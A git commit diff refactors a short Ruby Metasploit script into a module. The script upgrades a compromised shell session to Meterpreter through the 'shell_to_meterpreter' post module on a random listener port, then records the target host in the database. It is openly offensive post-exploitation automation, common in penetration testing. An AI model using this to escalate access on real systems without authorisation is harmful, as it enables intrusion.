5b1db47853b02d69c7f60474bfda0cebfd5db37d
leandro <38253462+lst15@users.noreply.github.com>
2025-12-10 20:43:08 -0300

    Refactor shell promotion methods into a module

--- shell_promotion.rb
+++ shell_promotion.rb
@@ -2,26 +2,27 @@
 # 1. Creates and runs the shell_to_meterpreter module.
 # 2. Ensures the host exists in the database.
 
-fm = client.framework
-target_ip = client.session_host
+module ShellPromotion
+  def self.ensure_host(fm, ip)
+    fm.db.hosts.find_by(address: ip) ||
+      fm.db.hosts.create(address: ip)
+  end
 
-def convert_shell_to_meterpreter(fm, sid, port, client)
-  mod = fm.post.create("multi/manage/shell_to_meterpreter")
-  mod.datastore["SESSION"] = sid
-  mod.datastore["LPORT"]   = port
+  def self.convert(fm, sid, port, client)
+    mod = fm.post.create("multi/manage/shell_to_meterpreter")
+    mod.datastore["SESSION"] = sid
+    mod.datastore["LPORT"]   = port
 
-  mod.run_simple(
-    'LocalInput'  => client.user_input,
-    'LocalOutput' => client.user_output,
-    'RunAsJob'    => false
-  )
+    mod.run_simple(
+      'LocalInput'  => client.user_input,
+      'LocalOutput' => client.user_output,
+      'RunAsJob'    => false
+    )
+  end
+
+  def self.run(fm, sid, target_ip, client)
+    port = rand(5000..59999)
+    convert(fm, sid, port, client)
+    ensure_host(fm, target_ip)
+  end
 end
-
-def ensure_host(fm, ip)
-  fm.db.hosts.find_by(address: ip) ||
-    fm.db.hosts.create(address: ip)
-end
-
-port = rand(5000..59999)
-convert_shell_to_meterpreter(fm, client.sid, port, client)
-ensure_host(fm, target_ip)
